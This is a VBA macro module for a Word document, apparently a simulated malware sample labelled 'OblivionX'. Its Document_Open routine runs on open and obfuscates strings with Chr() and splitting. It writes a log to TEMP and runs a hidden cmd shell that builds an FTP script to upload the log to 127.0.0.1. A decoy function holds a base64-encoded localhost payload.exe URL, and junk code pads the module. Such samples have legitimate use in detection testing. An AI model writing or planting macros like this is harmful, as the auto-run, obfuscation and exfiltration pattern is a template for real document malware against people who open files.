
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisDocument"
Private Sub Document_Open()
    Dim jybosg1pnivrj As Integer, logPath As String
    logPath = Environ("TEMP") & Chr(92) & Chr(111) & Chr(98) & Chr(108) & Chr(105) & Chr(118) & "ionx_lo" & "g.tx" & "t"
    jybosg1pnivrj = FreeFile
    Open logPath For Output As #jybosg1pnivrj
    Print #jybosg1pnivrj, "marker-" & "ftp-lo" & "g: simula" & "ted exfi" & "ltra" & "tion" & " data"
    Close #jybosg1pnivrj
    Shell "cmd /c echo open 127.0.0.1> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo put oblivionx_log.txt>> " & Environ("TEMP") & "\oblivionx_ftp.txt & echo quit>> " & Environ("TEMP") & "\obli" & "vionx_ft" & "p.tx" & "t", 0
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
